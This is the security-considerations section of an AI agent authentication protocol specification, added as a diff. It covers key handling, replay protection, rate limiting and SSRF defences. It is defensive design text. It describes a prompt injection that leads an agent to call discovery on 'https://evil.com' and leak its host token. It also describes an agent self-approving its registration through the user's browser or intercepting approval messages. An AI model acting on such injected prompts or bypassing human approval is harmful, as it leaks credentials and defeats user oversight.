@@ -1,0 +1,154 @@
+---
+title: "8. Security Considerations"
+description: "Section 8 of the Agent Auth Protocol specification."
+---
+
+## 8.1 Private Keys
+
+Private keys MUST never be transmitted to or stored on the server. The server stores only public keys or JWKS URLs.
+
+## 8.2 JWT Lifetime
+
+JWTs SHOULD expire within 60 seconds. Short lifetimes limit misuse even without proof of possession.
+
+## 8.3 Proof of Possession
+
+The base protocol does not require proof of possession. Short-lived JWTs over TLS are sufficient for many applications.
+
+For sensitive operations, servers SHOULD support a standard proof-of-possession profile:
+
+- **DPoP** — the client sends a separate DPoP proof JWT on each request, and the agent JWT SHOULD include `cnf.jkt`
+- **mTLS** — the client authenticates with a TLS client certificate, and the agent JWT SHOULD include `cnf.x5t#S256`
+
+This keeps the baseline simple for average apps while giving higher-assurance deployments a standards-aligned path.
+
+## 8.4 Replay Protection
+
+Servers MUST reject duplicate `jti` values within the JWT's lifetime window.
+
+## 8.5 Revocation Cascade
+
+Revoking a host MUST cascade to all agents under it.
+
+## 8.6 Capability Validation
+
+Servers SHOULD validate requested capability names against a known set. Servers MAY maintain a blocked capability list.
+
+## 8.7 Host Key Rotation
+
+Inline key hosts rotate via `POST /host/rotate-key` (§5.9). Since the client does not maintain a durable registry of every server a host is registered on, inline rotation is limited to servers the client currently knows about. For key compromise, revoke the host entirely — a compromised key means you cannot trust the rotation request itself.
+
+JWKS-based hosts rotate by updating their endpoint — the server picks up new keys on the next cache refresh (recommended: every 5 minutes or on `kid` miss). The old key SHOULD remain in the JWKS for a grace period to avoid rejecting in-flight requests.
+
+Hosts that register across many servers SHOULD prefer JWKS-based registration, since key rotation propagates automatically without the client needing to contact each server individually.
+
+## 8.8 Agent Key Compromise
+
+If an agent's private key is leaked, anyone holding it can impersonate that agent. This is inherent to any keypair-based system (same as a leaked SSH key or OAuth token). However, unlike bearer tokens, the agent's private key never traverses the wire — it can only leak from the client's local storage.
+
+Mitigations:
+- **Host-authorized key rotation.** Use `POST /agent/rotate-key` with a Host JWT to immediately invalidate the compromised key and replace it with a new one.
+- **Short TTL.** Agents with short `session_ttl` values auto-expire, limiting the window of compromise.
+- **Revocation.** If compromise is detected, revoke the agent immediately.
+- **Secure storage.** Clients SHOULD store agent private keys securely (keychain, encrypted file, memory-only).
+
+After registration, the agent authenticates independently with its own keypair — the host is not involved in every request. If binding agent requests to the host is required, implementations can enforce this at the server level.
+
+## 8.9 Discovery Security
+
+Discovery of arbitrary URLs is a prompt injection vector. A malicious prompt can trick an agent into calling `discover_provider(url: "https://evil.com")`, which returns a fake configuration. The client then sends the host JWT to the attacker's "register" endpoint.
+
+Mitigations:
+- **Registry-first discovery.** Clients SHOULD resolve new services through a trusted registry (§6.11) using `search_providers` rather than arbitrary URLs.
+- **User confirmation.** If `discover_provider` is called with a direct URL, the client SHOULD require user confirmation before fetching the configuration.
+- **Allowlists.** Clients MAY maintain an allowlist of trusted service URLs.
+- **Proof on host-authenticated registration.** For **discovered servers** (not pre-configured), clients SHOULD use DPoP or an equivalent request-specific proof on host-authenticated registration requests so they cannot be replayed to a different endpoint.
+- **TLS verification.** Clients MUST verify TLS certificates when fetching discovery endpoints.
+
+## 8.10 Approval Gravity
+
+User approval is the primary trust boundary in this protocol — for unknown host registration, capability escalation, and account linking.
+
+First-time host approval is the highest-risk moment: the server knows nothing about the host beyond a self-signed keypair. Servers SHOULD present the requested capabilities clearly and warn if the host is requesting unusually broad access.
+
+Capability escalation deserves the same scrutiny. Servers SHOULD NOT auto-approve high-risk capabilities even for linked hosts. Servers MUST calibrate approval requirements to the sensitivity of their capabilities — the protocol provides the mechanism (approval flows, fresh auth, 2FA), but the server decides which to enforce.
+
+## 8.11 Approval Self-Authorization
+
+Agents often run with access to the user's browser or session (via browser tools, MCP, automation frameworks). This creates a unique threat: an agent could navigate to the device authorization `verification_uri` and approve its own registration without the user being physically present.
+
+This is not a concern in traditional OAuth because the client requesting authorization doesn't control the user's browser. In Agent Auth, it often does.
+
+Mitigations, from least to most restrictive:
+- **Fresh authentication.** Require the user to have authenticated within a short window (e.g. 5 minutes). Stale sessions SHOULD NOT be sufficient to approve an agent.
+- **Biometric passkeys** (WebAuthn with `userVerification: "required"`) — proves a human is physically present
+- **Hardware security keys** — physical interaction required
+- **TOTP/OTP from a separate device** — ensures the approver has a second factor the agent can't access
+
+Approval pages SHOULD require fresh user authentication — a long-lived session cookie alone is not sufficient.
+
+The same applies to [CIBA](https://openid.net/specs/openid-client-initiated-backchannel-authentication-core-1_0.html) approvals. An agent with access to the user's notification channel (email tools, push notifications) could intercept the approval request. CIBA approval endpoints SHOULD require fresh authentication before completing the approval.
+
+## 8.12 URL Fetch Protection
+
+Both servers and clients fetch external URLs as part of the protocol. The threat model differs:
+
+- **Server-side fetches** (JWKS URLs provided by clients during registration) — classic SSRF. An attacker-controlled client sends a JWKS URL pointing to an internal service, tricking the server into making requests to its own infrastructure.
+- **Client-side fetches** (discovery endpoints, OpenAPI specs, JWKS URLs for server key verification) — not SSRF in the traditional sense, but a malicious or compromised URL can probe the client's local network, exfiltrate data via DNS, or serve oversized responses to exhaust resources.
+
+**Server-side URL fetches** (JWKS URLs) MUST apply:
+
+- **IP filtering.** Block private, loopback, and link-local ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`). Resolve DNS **before** connecting and check the resolved IP — not just the hostname.
+- **DNS rebinding protection.** Pin the resolved IP for the duration of the request. Do not re-resolve between DNS lookup and connection.
+- **HTTPS only.** Reject `http://` URLs.
+- **Redirect limits.** Follow at most 3 redirects. Validate each redirect target against the same IP filtering rules.
+- **Response size limits.** Cap response bodies (e.g. 1 MB for JWKS). Abort on oversized responses.
+- **Timeouts.** Enforce connect and read timeouts (e.g. 5 seconds each).
+
+**Client-side URL fetches** (discovery, OpenAPI specs, server JWKS) SHOULD apply:
+
+- **HTTPS only.** Reject `http://` URLs.
+- **Response size limits.** Cap response bodies (e.g. 1 MB for discovery/JWKS, 10 MB for OpenAPI specs). Abort on oversized responses.
+- **Timeouts.** Enforce connect and read timeouts (e.g. 5 seconds each).
+- **Redirect limits.** Follow at most 3 redirects.
+
+For discovery-specific protections (allowlists, user confirmation, TLS verification), see §8.9.
+
+## 8.13 Rate Limiting
+
+Servers MUST implement rate limiting. Agents can generate high request volumes — both legitimately and due to bugs or compromised keys.
+
+**Dimensions:** Rate limits SHOULD apply at multiple levels:
+
+| Level | What it limits | Example |
+|---|---|---|
+| Per agent | Requests from a single agent (by `sub` claim) | 60 requests/minute |
+| Per host | Requests from all agents under a host | 300 requests/minute |
+| Per user | Requests from all agents linked to a user (by `user_id`) | 600 requests/minute |
+| Per capability | Requests to a specific capability | 10 transfers/hour |
+| Per IP | Unauthenticated endpoints (registration, discovery) | 30 requests/minute |
+
+Servers decide which dimensions to enforce and at what thresholds. High-risk capabilities (e.g. financial transfers) SHOULD have tighter per-capability limits than read-only capabilities.
+
+**Response:** When rate limited, the server MUST return `429` with the `rate_limited` error code (§5.13) and SHOULD include a `Retry-After` header (seconds until the client can retry):
+
+```
+HTTP/1.1 429 Too Many Requests
+Retry-After: 30
+Content-Type: application/json
+
+{"error": "rate_limited", "message": "Agent agt_abc123 exceeded 60 requests/minute"}
+```
+
+Clients MUST respect `Retry-After` when present. If absent, clients SHOULD use exponential backoff starting at 1 second.
+
+**Unknown host registration** is particularly sensitive to abuse. Servers SHOULD apply aggressive rate limits per IP on `POST /agent/register` for unknown hosts (e.g. 5 per hour per IP).
+
+## 8.14 Proof of Possession Profiles
+
+The protocol relies on JWT signatures over TLS for authentication. For high-security deployments (financial services, healthcare, government), servers MAY require an additional proof-of-possession profile:
+
+- **DPoP.** Servers MAY require a DPoP proof JWT on each request. When used, the agent JWT SHOULD carry `cnf.jkt` so the server can bind the access token to the DPoP proof key.
+- **Mutual TLS (mTLS).** Servers MAY require client certificates in addition to JWT authentication. When used, the agent JWT SHOULD carry `cnf.x5t#S256` so the server can bind the access token to the client certificate.
+
+These are optional enhancements. The base protocol's security model (short-lived signed JWTs + TLS) is sufficient for most deployments. Proof of possession adds defense-in-depth for environments where token theft or replay is a realistic threat.
